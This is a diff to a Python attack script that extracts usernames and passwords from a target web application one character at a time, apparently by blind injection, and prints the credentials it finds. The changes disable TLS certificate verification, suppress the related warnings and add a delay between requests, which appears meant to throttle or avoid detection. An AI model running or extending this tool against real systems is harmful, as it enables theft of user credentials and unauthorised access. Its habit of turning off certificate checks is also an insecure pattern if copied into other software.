@@ -1,6 +1,12 @@
 #!/usr/bin/env python3
 
 import requests,argparse,sys
+from time import sleep
+
+from urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+requests_delay = 1
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-t",help="Target URL")
@@ -36,7 +42,7 @@ if (args.json is True) and (args.m != "POST"):
 	
 def get_request(data):
 	global args
-	response = requests.get(args.t,params=data,allow_redirects=False)
+	response = requests.get(args.t,params=data,allow_redirects=False,verify=False)
 	if response.status_code != int(args.c):
 		return False
 	if args.s not in response.text:
@@ -45,8 +51,9 @@ def get_request(data):
 
 def post_request_json(data):
 	global args
-	response = requests.post(args.t,json=data,allow_redirects=False)
+	response = requests.post(args.t,json=data,allow_redirects=False,verify=False)
 	if response.status_code != int(args.c):
+		#print(response.status_code,args.c)
 		return False
 	if args.s not in response.text:
 		return False
@@ -54,7 +61,7 @@ def post_request_json(data):
 	
 def post_request(data):
 	global args
-	response = requests.post(args.t,data=data,allow_redirects=False)
+	response = requests.post(args.t,data=data,allow_redirects=False,verify=False)
 	if response.status_code != int(args.c):
 		return False
 	if args.s not in response.text:
@@ -128,8 +135,10 @@ for firstChar in charset:
 				if enum_users(data,username+char):
 					username = username + char
 					stop = False
+				sleep(requests_delay)
 		usernames.append(username)
-		print("\r[+] FOUND USERNAME: "+username+"\n",flush=False)
+		print("\r[+] FOUND USERNAME: "+username,flush=False)
+	sleep(requests_delay)
 		
 print("\r                            ",flush=False)
 if len(usernames) == 0:
@@ -166,8 +175,10 @@ for username in usernames:
 					if enum_passwords(data,passw+char,username):
 						passw = passw + char
 						stop = False
+					sleep(requests_delay)
 			passwords[username] = passw
-			print("\r[+] FOUND PASSWORD: "+passw+"\n",flush=False)
+			print("\r[+] FOUND PASSWORD: "+passw,flush=False)
+		sleep(requests_delay)
 print("\r                            ",flush=False)		
 # print results
 print("\n----------------CREDS-FOUND---------------------")
